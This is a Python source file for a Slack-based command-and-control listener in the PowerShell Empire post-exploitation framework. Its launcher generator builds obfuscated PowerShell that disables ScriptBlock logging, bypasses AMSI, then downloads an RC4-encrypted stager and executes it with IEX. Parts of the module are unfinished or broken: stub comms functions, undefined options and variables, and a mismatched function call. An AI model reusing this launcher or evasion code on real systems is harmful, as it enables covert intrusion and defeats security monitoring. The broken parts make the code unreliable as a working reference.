import base64
import random
import os
import re
import time
from datetime import datetime
import copy
import traceback
import sys
import json
from pydispatch import dispatcher
from slackclient import SlackClient

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Slack',

            'Author': ['@OneLogicalMyth'],

            'Description': ("Starts a listener for Slack using the API."),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'slack'
            },
            'APIToken' : {
                'Description'   :   'API Token, visit https://slack.com/apps/A0F7YS25R to get one.',
                'Required'      :   True,
                'Value'         :   'xoxb-123456789123-123456789123-ExampleSlackAPIToken'
            },
            'ChannelComms' : {
                'Description'   :   'The Slack channel to use for comms.',
                'Required'      :   True,
                'Value'         :   'empire_comms'
            },
            'PollInterval' : {
                'Description'   :   'How often to check Slack for new messages (Empire instance/server side). Recommended is 1 second.',
                'Required'      :   True,
                'Value'         :   1
            },
            'StartMessage' : {
                'Description'   :   'When the listener starts it will post this message to the Slack channel, just a bit of fun.',
                'Required'      :   False,
                'Value'         :   'An Empire listener for Slack has started. :point_up:'
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   'ec1a0eab303df7f47caaed136561a960'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "N/A|Slackbot 1.0(+https://api.slack.com/robots)"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'SlackToken' : {
                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackChannel' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   False,
                'Value'         :   '#general'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module
        self.options['ChannelComms_ID'] = {
                                            'Description' : 'channel internal ID that slack uses',
                                            'Required'    : False,
                                            'Value'       : 'tbc'
                                          }

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        print helpers.color("[!] default_response() not implemented for listeners/template")
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        # validate Slack API token and configuration
        sc = SlackClient(self.options['APIToken']['Value'])
        SlackChannels = sc.api_call('channels.list')

        # if the token is unable to retrieve the list of channels return exact error, most common is bad API token
        if 'error' in SlackChannels:
            print helpers.color('[!] An error was returned from Slack: ' + SlackChannels['error'])
            return False
        else:

            CommsName   = self.options['ChannelComms']['Value']

            # build a list of channel names and store the channel info for later use
            ChannelNames = []
            CommsChannel = None

            for channel in SlackChannels['channels']:
                ChannelNames.append(channel['name'])
                if CommsName == channel['name']:
                    CommsChannel = channel

            if not CommsName in ChannelNames or CommsChannel == None:
                print helpers.color('[!] No channel "' + CommsName + '", bots can\'t create channels so please fix manually.')
                return False
            elif CommsChannel['is_archived']:
                print helpers.color('[!] Channel "' + CommsName + '" is archived, bots can\'t unarchive channels so please fix manually.')
                return False
            elif not CommsChannel['is_member']:
                print helpers.color('[!] Bot is not a member of channel "' + CommsName + '", bots can\'t join channels so please fix manually.')
                return False

            self.options['ChannelComms_ID']['Value'] = CommsChannel['id']

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        if not language:
            print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
            staging_key = listener_options['StagingKey']['Value']
            profile = listener_options['DefaultProfile']['Value']
            launcher_cmd = listener_options['Launcher']['Value']
            staging_key = listener_options['StagingKey']['Value']
            poll_interval = listener_options['PollInterval']['Value']
            base_folder = listener_options['BaseFolder']['Value'].strip("/")
            staging_folder = listener_options['StagingFolder']['Value']
            taskings_folder = listener_options['TaskingsFolder']['Value']
            results_folder = listener_options['ResultsFolder']['Value']

            if language.startswith("power"):
                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging

                if safeChecks.lower() == 'true':
                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")

                    # ScriptBlock Logging bypass
                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.Utils'"
                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
                    launcher += "['ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("){$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
                    launcher += "('EnableScriptB'+'lockLogging',0);"
                    launcher += helpers.randomize_capitalization("$val.Add")
                    launcher += "('EnableScriptBlockInvocationLogging',0);"
                    launcher += helpers.randomize_capitalization("$GPC")
                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                    launcher += helpers.randomize_capitalization("=$val}")
                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                    launcher += "'signatures','N'+'onPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")

                    # @mattifestation's AMSI bypass
                    launcher += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                    launcher += "'System.Management.Automation.AmsiUtils'"
                    launcher += helpers.randomize_capitalization(');$Ref.GetField(')
                    launcher += "'amsiInitFailed','NonPublic,Static'"
                    launcher += helpers.randomize_capitalization(").SetValue($null,$true);")
                    launcher += "};"
                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listener_options['DefaultProfile']['Value']
                    userAgent = profile.split("|")[1]
                launcher += "$u='" + userAgent + "';"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':
                    if userAgent.lower() != 'none':
                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
                        launcher += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                    if proxyCreds.lower() == "default":
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                    launcher += "$Script:Proxy = $wc.Proxy;"

                # code to turn the key string into a byte array
                launcher += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                launcher += ("'%s');" % staging_key)

                # this is the minimized RC4 launcher code from rc4.ps1
                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
                launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")

                launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)

                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(launcher, launcher_cmd)
                else:
                    return launcher

            if language.startswith("pyth"):
                print helpers.color("[!] listeners/slack generate_launcher(): Python agent not implimented yet")
                return "python not implimented yet"

        else:
            print helpers.color("[!] listeners/slack generate_launcher(): invalid listener name")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
        """
        Generate the stager code
        """

        if not language:
            print helpers.color("[!] listeners/slack generate_stager(): no language specified")
            return None

        staging_key = listenerOptions['StagingKey']['Value']
        base_folder = listenerOptions['BaseFolder']['Value']
        staging_folder = listenerOptions['StagingFolder']['Value']
        working_hours = listenerOptions['WorkingHours']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        agent_delay = listenerOptions['DefaultDelay']['Value']

        if language.lower() == 'powershell':
            f = open("%s/data/agent/stagers/slack.ps1" % self.mainMenu.installPath)
            stager = f.read()
            f.close()

            stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
            stager = stager.replace("REPLACE_TOKEN", token)
            stager = stager.replace("REPLACE_POLLING_INTERVAL", str(agent_delay))

            if working_hours != "":
                stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)

            randomized_stager = ''

            for line in stager.split("\n"):
                line = line.strip()

                if not line.startswith("#"):
                    if "\"" not in line:
                        randomized_stager += helpers.randomize_capitalization(line)
                    else:
                        randomized_stager += line

            if encode:
                return helpers.enc_powershell(randomized_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
            else:
                return randomized_stager

        else:
            print helpers.color("[!] Python agent not available for Slack")


    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
        """
        Generate the agent code
        """

        if not language:
            print helpers.color("[!] listeners/slack generate_agent(): No language specified")
            return

        language = language.lower()
        delay = listener_options['DefaultDelay']['Value']
        jitter = listener_options['DefaultJitter']['Value']
        profile = listener_options['DefaultProfile']['Value']
        lost_limit = listener_options['DefaultLostLimit']['Value']
        working_hours = listener_options['WorkingHours']['Value']
        kill_date = listener_options['KillDate']['Value']
        b64_default_response = base64.b64encode(self.default_response())

        if language == 'powershell':
            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
            agent_code = f.read()
            f.close()

            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)

            agent_code = helpers.strip_powershell_comments(agent_code)

            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')

            if kill_date != "":
                agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")

            return agent_code


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """

        if language:
            if language.lower() == 'powershell':

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])

                getTask = """
                    $script:GetTask = {


                    }
                """

                sendMessage = """
                    $script:SendMessage = {
                        param($Packets)

                        if($Packets) {

                        }
                    }
                """

                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"

            elif language.lower() == 'python':
                # send_message()
                pass
            else:
                print helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
        else:
            print helpers.color('[!] listeners/template generate_comms(): no language specified!')


    def start_server(self, listenerOptions):

        # utility function for handling commands
        def parse_commands(slack_events,bot_id):

            # Parses a list of events coming from the Slack RTM API to find commands.
            for event in slack_events:
                if event["type"] == "message" and not "subtype" in event:

                    # split format of {{AGENT_NAME}}:{{BASE64_RC4}}
                    if ':' in event["text"] and not event["user"] == bot_id:
                        agent, message = event["text"].split(':')
                        return agent, message

            return None, None

        # utility functions for handling Empire
        def upload_launcher():
            pass

        def upload_stager():
            pass

        def handle_stager():
            pass

        listener_options = copy.deepcopy(listenerOptions)

        listener_name = listener_options['Name']['Value']
        staging_key = listener_options['StagingKey']['Value']
        poll_interval = listener_options['PollInterval']['Value']
        api_token = listener_options['APIToken']['Value']
        channel_id = listener_options['ChannelComms_ID']['Value']
        startup_message = listener_options['StartMessage']['Value']

        slack_client = SlackClient(api_token)

        if slack_client.rtm_connect(with_team_state=False,auto_reconnect=True):

            # Read bot's user ID by calling Web API method `auth.test`
            bot_id = slack_client.api_call("auth.test")["user_id"]

            # post a message if present
            if startup_message:
                slack_client.api_call(
                    "chat.postMessage",
                    channel=channel_id,
                    as_user=True,
                    text=startup_message
                )
            
            # Set the listener in a while loop
            while True:

                # sleep for poll interval
                time.sleep(int(poll_interval))

                # try to process command sent if fails then simply wait until next poll interval and try again
                try:
                    agent, message = parse_commands(slack_client.rtm_read(),bot_id)
                    if message:
                        slack_client.api_call(
                            "chat.postMessage",
                            channel=channel_id,
                            as_user=True,
                            text='Not implemented.'
                        )
                        print helpers.color('[!] Not implemented... message from "{}": {}'.format(agent,message))
                   
                except Exception as e:
                    print helpers.color("[!] The command '" + str(command) + "' was sent by '" + str(user) + "' but failed. Exception is '" + str(e) + "'")
                
        else:
            print helpers.color("[!] Connection failed. Exception printed above.")
        


    def start(self, name=''):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """

        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

        return True


    def shutdown(self, name=''):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()

        pass
